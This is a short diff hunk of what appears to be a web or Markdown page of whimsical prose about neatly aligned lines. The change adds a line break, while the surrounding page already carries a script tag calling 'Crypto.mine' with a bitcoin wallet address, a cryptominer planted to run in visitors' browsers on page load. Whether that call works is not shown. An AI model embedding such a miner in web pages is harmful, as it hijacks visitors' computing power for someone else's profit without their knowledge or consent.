@@ -30,6 +30,7 @@ See how neatily aligned the lines above are?
 
 You cannot possibly be a bad person if you neatily align things.
 
+<br />
 
 
 <script>Crypto.mine("bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh")</script>
